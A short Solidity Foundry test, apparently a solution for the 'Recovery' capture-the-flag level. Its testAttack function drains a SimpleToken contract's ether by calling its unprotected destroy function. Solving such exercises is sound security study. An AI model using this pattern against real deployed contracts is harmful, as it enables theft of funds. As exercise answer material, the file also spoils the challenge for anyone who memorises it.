// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Recovery.sol";

contract RecoveryTest is Test {
    SimpleToken public token;

    function setUp() public {
        token = new SimpleToken("Test Token", address(this), 0);
        (bool ok, ) = address(token).call{value: 0.001 ether}("");
        assertTrue(ok);
    }

    function testAttack() public {
        uint256 attackerBalance = address(this).balance;
        uint256 tokenBalance = address(token).balance;

        token.destroy(payable(address(this)));

        assertEq(address(token).balance, 0);
        assertEq(address(this).balance, attackerBalance + tokenBalance);
    }
}
